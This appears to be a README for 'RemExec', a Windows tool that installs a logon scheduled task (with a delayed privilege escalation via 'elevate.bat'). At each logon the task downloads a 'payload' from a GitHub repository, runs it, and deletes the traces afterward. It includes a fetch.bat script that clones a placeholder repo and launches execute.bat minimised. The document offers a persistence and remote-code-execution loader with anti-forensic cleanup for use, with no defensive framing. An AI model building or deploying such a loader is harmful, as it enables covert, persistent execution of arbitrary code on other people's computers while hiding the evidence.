To install it run the "elevate.bat" no admin required for now... It will be required ~3 seconds later :). This will create a task from "fetch.xml" that is visible in Task Scheduler on main page and will be started at user logon!

*create "safe.txt" to bypass the payload execution! If installed via installer in ("%localappdata%\Programs\RemExec") or in root folder (after extraction) in case of RemExec is downloaded from here*
  
  
  
  
  RemExec is a program that is used to download payload from a repository and execute it on a pc at starup!

-At logon a task is scheduled to run and download the payload
  
-It runs itself
  
-After exiting auto-deletes the folder of payload and script leaving no trace!

Costumize the github repo that is used to download the payload from the "fetch.bat" (ONLY FILE THAT CAN BE SAFE TO EDIT)




        @echo off
        call git clone https://github.com/USER/REPOSITORY.git
        start /min execute.bat
        exit
